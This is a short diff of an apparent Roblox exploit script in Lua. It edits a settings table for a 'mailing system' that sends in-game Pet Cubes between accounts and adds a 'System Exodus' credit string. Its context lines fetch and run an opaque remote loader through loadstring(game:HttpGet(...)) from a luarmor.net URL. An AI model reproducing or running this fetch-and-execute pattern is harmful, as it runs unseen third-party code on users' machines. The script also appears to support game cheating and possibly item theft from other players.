@@ -47,9 +47,9 @@ if success then
                 },
                 ["Split Items Evenly"] = false,
                 ["Only Online Accounts"] = false,
+                    
+                [[ Thank you for using System Exodus <3! ]]
             }
-
-            print("Loading mailing system...")
             loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
         else
             print(username .. " has more than 2000 Pet Cubes. No cubes sent.")
